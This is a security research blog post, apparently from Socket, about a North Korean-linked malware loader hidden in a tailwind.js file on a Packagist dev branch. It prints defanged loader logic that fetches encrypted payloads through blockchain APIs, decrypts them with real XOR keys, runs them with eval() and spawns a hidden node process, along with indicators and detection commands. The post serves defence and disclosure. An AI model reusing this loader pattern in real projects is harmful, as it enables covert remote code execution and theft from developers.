---
title: "Famous Chollima Targets PHP Developers Through Compromised Packagist Package"
short_title: "Famous Chollima Targets PHP Developers via Packagist"
date: 2026-05-31 12:00:00 +0000
categories: [Malware, Supply Chain]
tags: [Famous Chollima, Contagious Interview, Packagist, Composer, PHP, T1195.002, T1204.002, T1059.007, T1027, T1102.001, T1105]
canonical_url: https://socket.dev/blog/famous-chollima-targets-php-developers-through-compromised-packagist-package
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/9c9f4529da2ec05ccce30e3b294d2485de9a666a-1672x941.png?w=1600&q=95&fit=max&auto=format
  alt: "Famous Chollima Targets PHP Developers Through Compromised Packagist Package"
description: "The North Korean malware loader hides in a Packagist-listed package and its GitHub branch to fetch and execute remote code in a likely Contagious Interview-style lure."
---

We identified malicious obfuscated JavaScript appended to [`tailwind.js`](https://socket.dev/composer/package/roberts/leads/files?version=dev-drewroberts%2Ffeature%2Ftest-case&path=roberts-leads-6c5c3c7%2Ftailwind.js) in the Packagist development version [`dev-drewroberts/feature/test-case`](https://socket.dev/composer/package/roberts/leads/overview?version=dev-drewroberts%2Ffeature%2Ftest-case) of the PHP package `roberts/leads`. The package itself is a legitimate Laravel package associated with a maintainer, [Drew Roberts](https://github.com/drewroberts). The malicious code appears isolated to a specific development branch, `drewroberts/feature/test-case`, exposed through Packagist as an installable dev version.

![](https://cdn.sanity.io/images/cgdhsj6q/production/123c88ecae299e119909029164267cc49dc03888-1248x1166.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner flagged [`dev-drewroberts/feature/test-case`](https://socket.dev/composer/package/roberts/leads/overview?version=dev-drewroberts%2Ffeature%2Ftest-case) as known malware after identifying obfuscated JavaScript hidden in [`tailwind.js`](https://socket.dev/composer/package/roberts/leads/files?version=dev-drewroberts%2Ffeature%2Ftest-case&path=roberts-leads-6c5c3c7%2Ftailwind.js), including runtime exposure of Node.js internals and immediate execution of a decoded staging payload rather than legitimate Tailwind configuration logic._

The payload is hidden after an otherwise normal Tailwind configuration. Once deobfuscated, it behaves as a JavaScript malware loader. It reaches out to blockchain and public RPC infrastructure, including TRON, Aptos, and BNB Smart Chain services, retrieves encrypted payload material, decrypts it with embedded XOR keys, executes the result with `eval()`, and can launch a detached hidden Node.js child process.

We assess this as a likely developer or repository compromise, or a poisoned-branch workflow, rather than a malicious package created from scratch. The malicious code appears confined to a dev/test branch exposed through Packagist, while the stable release line did not show the same indicators in our review. This pattern closely resembles recent GitHub Community [reports](https://github.com/orgs/community/discussions/188732) of malicious JavaScript being injected into legitimate developer configuration files as part of an active supply chain campaign [associated](https://www.trendmicro.com/en_us/research/26/d/void-dokkaebi-uses-fake-job-interview-lure-to-spread-malware-via-code-repositories.html) with North Korean APT activity and Famous Chollima. While the threat group originally gained notoriety for infiltrating companies as fake employees, they are equally famous for reversing the script, creating fake companies and jobs to compromise external developers.

Given the branch name, the malware family, identified indicators of compromise, and the delivery path through trusted developer infrastructure, this package version may have been intended for a fake job interview or developer-task lure, consistent with a Contagious Interview-like scenario.

![](https://cdn.sanity.io/images/cgdhsj6q/production/88fcab5de68317c8a2db19daa44fb83cd585ea78-2048x2027.png?w=1600&q=95&fit=max&auto=format)
_Packagist listed the affected `roberts/leads` dev branch as an installable version. We reported it to the Packagist security team, who promptly reviewed the issue and removed the malicious version. We appreciate their quick response in this case and their continued action on PHP ecosystem abuse reports._

In addition to reporting the affected version to Packagist’s security team, we also notified the project maintainer, Drew Roberts, both through GitHub and through the email address listed for reporting security incidents. In parallel, we flagged the malicious `tailwind.js` file in the affected GitHub repository branch to GitHub Security for review.

## The Malicious `tailwind.js`

At first glance, `tailwind.js` looks like a normal Tailwind configuration file:

```javascript
module.exports = {
    purge: [],
    theme: {
        extend: {},
    },
    variants: {},
    plugins: [],
};
```

The malicious payload appears after the legitimate config, hidden far to the right after a large whitespace gap:

```javascript
};                                                                                                                           global['!']='9-0264-2';var _$_1e42=...

```

Everything after the closing `};` is unrelated to Tailwind. The appended JavaScript is obfuscated and reconstructs its real behavior at runtime.

## Deobfuscation Findings

The loader uses several concealment and staging techniques:

- A large whitespace gap hides the malicious payload after the legitimate Tailwind configuration, making it easy to miss in code review.
- The campaign marker `global['!']='9-0264-2'` is later expanded into `global['_V']='A9-0264-2'`.
- Global aliases reconstruct Node.js internals, including `require` and `module`, to obscure later calls.
- Blockchain and public RPC infrastructure provide encrypted payload material.
- Hardcoded XOR keys decrypt the retrieved content into executable JavaScript.
- `eval()` executes the decrypted payload inside the Node.js process.
- `child_process.spawn()` can launch a detached hidden Node.js process with `windowsHide: true`.

## Loader Behavior

The deobfuscated loader uses blockchain infrastructure as a dead drop mechanism. TRON and Aptos provide payload pointers, while BNB Smart Chain RPC services return transaction input data containing encrypted payload material.

A shortened, simplified, and defanged excerpt of the loader logic is shown below:

```javascript
async function resolvePayload(xorKey, tronWallet, aptosFallback) {
    let txHash;

    try {
        txHash = Buffer.from(
            (await getJson(
                "hxxps://api[.]trongrid[.]io/v1/accounts/" +
                tronWallet +
                "/transactions?only_confirmed=true&only_from=true&limit=1"
            )).data[0].raw_data.data,
            "hex"
        ).toString("utf8").split("").reverse().join("");
        // Uses TRON transaction data as a payload pointer.
    } catch {
        txHash = (
            await getJson(
                "hxxps://fullnode[.]mainnet[.]aptoslabs[.]com/v1/accounts/" +
                aptosFallback +
                "/transactions?limit=1"
            )
        )[0].payload.arguments[0];
        // Falls back to Aptos if TRON retrieval fails.
    }

    const encryptedPayload = await getBscTransactionInput(txHash);
    return xorDecrypt(encryptedPayload, xorKey);
}

const firstStage = await resolvePayload(
    "2[gWfGj;<:-93Z^C",
    "TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP",
    "0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e"
);

eval(firstStage);
// Executes threat actor-controlled JavaScript retrieved through blockchain infrastructure.

const secondStage = await resolvePayload(
    "m6:tTh^D)cBz?NM]",
    "TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG",
    "0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3"
);

require("child_process").spawn(
    "node",
    ["-e", "global['_V']='A9-0264-2';" + secondStage],
    {
        detached: true,
        stdio: "ignore",
        windowsHide: true
    }
);
// Launches a hidden detached Node.js process for the second-stage payload.
```

This design lets the threat actor change the second-stage payload without modifying the package. It also makes the network path less obvious because the loader contacts public blockchain and RPC services rather than a traditional C2 domain.

## Exfiltration and Final Payload Scope

The visible loader in `tailwind.js` does not directly exfiltrate files, environment variables, credentials, wallet data, or source code. Its immediate function is to retrieve, decrypt, and execute remote JavaScript.

That distinction is important, but it does not reduce the risk. Once executed inside Node.js, the remote payload can access:

- `process.env`, including CI secrets and cloud credentials if present
- Local files, including `.env` files, SSH keys, package tokens, and project source code
- Git metadata and credentials available to the process
- Network APIs and child process execution through Node.js

We did not identify geofencing, user agent checks, locale checks, or environment based targeting in the local loader. The visible logic includes fallback payload retrieval, execution throttling, and fallback execution if hidden process spawning fails. Any additional targeting or exfiltration logic would reside in the remote payload.

In prior reports using the same blockchain-C2 infrastructure and overlapping wallet addresses, the loader ultimately delivered DPRK-linked malware including DEV#POPPER RAT, OmniStealer, and BeaverTail-family payloads. Trend Micro [observed](https://www.trendmicro.com/en_us/research/26/d/void-dokkaebi-uses-fake-job-interview-lure-to-spread-malware-via-code-repositories.html) a DEV#POPPER RAT variant delivered through this infrastructure, while eSentire [documented](https://www.esentire.com/blog/north-korean-apt-malware-analysis-dev-popper-rat-and-omnistealer-everyday-im-shufflin) a related ShoeVista chain that retrieved DEV#POPPER RAT from blockchain transaction data and led to OmniStealer execution. OpenSourceMalware’s PolinRider [reporting](https://opensourcemalware.com/blog/polinrider-attack) describes the same loader architecture as culminating in a DPRK BeaverTail variant and repository-propagation backdoor/infostealer behavior.

## Why This Looks Targeted

This does not appear to be a broad stable release compromise. The malicious code is in a dev version, not the latest stable release. Packagist dev versions usually require explicit selection or relaxed stability settings, which makes accidental mass installation less likely.

That fits a targeted developer lure. A victim could be instructed to install the exact dev version:

```sh
composer require roberts/leads:dev-drewroberts/feature/test-case
```

or clone the GitHub repository and check out the branch:

```sh
git clone hxxps://github[.]com/roberts/leads.git
cd leads
git checkout drewroberts/feature/test-case
```

In a fake job interview or developer task, those commands would look routine. The attacker does not need high package adoption. They only need one target to trust and run the poisoned branch.

![](https://cdn.sanity.io/images/cgdhsj6q/production/36802e02dd7931de29b2311df96972b90ada3ea5-2048x1106.png?w=1600&q=95&fit=max&auto=format)
_The malicious loader is visible only after horizontal scrolling in the `tailwind.js` file on the affected GitHub branch, reinforcing how a targeted victim could clone a legitimate-looking repository branch and miss the hidden payload during routine review._

The affected `roberts/leads` dev version was published on May 30, 2026, the same day our automated AI scanner identified it as malicious. We are publishing this research within hours of detection, and at the time of writing, we did not identify public victim communications instructing developers to install this exact version or evidence of broad organic exposure. Those instructions, if used, would likely appear in private recruiter chats, email, or direct messages. However, the same wallet addresses, Aptos fallback identifiers, XOR keys, and config-file injection pattern appear in public victim reports, including [development-team compromise](https://usmandev.medium.com/how-two-sophisticated-crypto-stealing-malware-attacks-hit-our-development-team-a-complete-supply-3db4be232491) and [OpenClaw malware](https://www.tylerhenkel.com/blog/openclaw-malware-attack) write-ups, as well as [GitHub Community](https://github.com/orgs/community/discussions/188732) and [Reddit](https://www.reddit.com/r/github/comments/1sw76n6/obfuscated_code_appeared_only_in_a_git_merge/) help requests and research on [Contagious Interview-style](https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/) developer compromise activity.

## Recommendations and Mitigations

Developers should treat unfamiliar build instructions as code execution events, especially during interviews, coding tests, and recruiter-led tasks. Avoid running untrusted dev branches or project setup commands without first reviewing build configuration files.

Before running unfamiliar PHP or JavaScript projects, inspect:

- `composer.json`
- `package.json`
- `webpack.mix.js`
- `vite.config.*`
- `next.config.*`
- `postcss.config.*`
- `tailwind.config.*`
- `tailwind.js`
- `.github/workflows/*`
- `scripts/*`

Security teams should monitor for Node.js processes contacting blockchain or RPC services during builds, especially followed by `node -e`, `child_process.spawn`, detached execution, or hidden windows.

Organizations should restrict CI secrets to the minimum required scope, avoid exposing long-lived credentials to branch builds, and rotate credentials after suspicious package execution.

Package consumers should pin known good versions and avoid Packagist dev branches unless required. Review `minimum-stability`, `prefer-stable`, and explicit `dev-*` dependency constraints.

Maintainers should review branch protection rules, GitHub personal access tokens, OAuth applications, Packagist webhooks, deploy keys, and collaborator permissions. Preserve branch and commit evidence before deletion when possible.

Suggested local check:

```sh
grep -RInF \
  -e "global['!']" \
  -e '_$_1e42' \
  -e 'rmcej%otb%' \
  -e 'trongrid' \
  -e 'aptoslabs' \
  -e 'bsc-dataseed' \
  -e 'bsc-rpc' \
  -e 'eth_getTransactionByHash' \
  -e 'windowsHide' \
```

Suggested Git ref scan:

```sh
git clone --mirror hxxps://github[.]com/roberts/leads.git roberts-leads.git
cd roberts-leads.git

for ref in $(git for-each-ref --format='%(refname)' refs/heads refs/tags | sort -u); do
  git grep -nI -F \
    -e "global['!']" \
    -e '_$_1e42' \
    -e 'rmcej%otb%' \
    "$ref" -- . 2>/dev/null || true
done
```

## Indicators of Compromise

### Package and Repository

- Affected Packagist version: `dev-drewroberts/feature/test-case`
- Mapped GitHub branch: `drewroberts/feature/test-case`
- Affected file: `tailwind.js`
- Observed branch commit: `6c5c3c7655ce76399af11126b7e9a9058eb2e45d`
- Package URL: `https://packagist.org/packages/roberts/leads`
- Repository URL: `https://github.com/roberts/leads`
- Affected file URL: `hxxps://github[.]com/roberts/leads/blob/drewroberts/feature/test-case/tailwind.js`

### SHA-256 Hashes

- Archive: `522b28a2f78771715497ba53729d4ab9a50e982322c391379f3bddf7c8cb363f`
- `tailwind.js`: `96afdba882046385242cbed46871e41147c8055c5d9eff7460847b2c01a77dc3`

### TRON Wallets

- `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP`
- `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG`

### Aptos Fallback Identifiers

- `0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e`
- `0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3`

### XOR Keys

- `2[gWfGj;<:-93Z^C`
- `m6:tTh^D)cBz?NM]`

## MITRE ATT&CK

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1204.002 — User Execution: Malicious File
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1027 — Obfuscated Files or Information
- T1102.001 — Web Service: Dead Drop Resolver
- T1105 — Ingress Tool Transfer
